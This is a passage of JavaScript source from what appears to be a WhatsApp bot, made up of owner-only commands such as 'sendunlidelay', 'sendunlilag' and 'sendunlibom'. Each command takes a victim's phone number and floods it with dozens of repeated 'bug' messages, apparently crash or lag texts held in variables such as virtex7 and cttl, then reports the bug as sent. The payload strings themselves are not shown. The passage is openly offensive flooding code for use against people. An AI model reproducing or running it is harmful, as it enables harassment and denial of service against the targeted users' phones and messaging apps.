haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: bugthomz,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
haikal.sendMessage(Pe, { image: ppuser,  caption: `${buttonkal}` }, { quoted:thomz })
await sleep(2000)
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
case 'sendunlidelay' :  case '🐒':{
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: virtex7}, {quoted:thomz})
await sleep(2000)
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlilag' : case'🙊': {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: cttl}, {quoted:thomz})
await sleep(2000)
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlibom' :  case '🙉':{
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: weg}, {quoted:thomz})
await sleep(2000)
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlicuy' :  case '🙈':{
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
Pe = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(Pe, {text: tizi}, {quoted:thomz})
await sleep(2000)
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
 case 'unlitet' :  {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: `${botname}`}, {quoted:thomz})
await sleep(2000)
}
break
//=================================================//
case 'unlidelay' :  {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: virtex7}, {quoted:thomz})
await sleep(2000)
}
break
//=================================================//
case 'unlilag' :  {
 if (!isOwner) return m.reply('*khusus Bang Thomz*')
 if (!text) return reply(`penggunaan salah thomz harusnya ${prefix+command} 628xxx `)
 await reply(mess.wait)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
await sleep(2000)
haikal.sendMessage(from, {text: cttl}, {quoted:thomz})
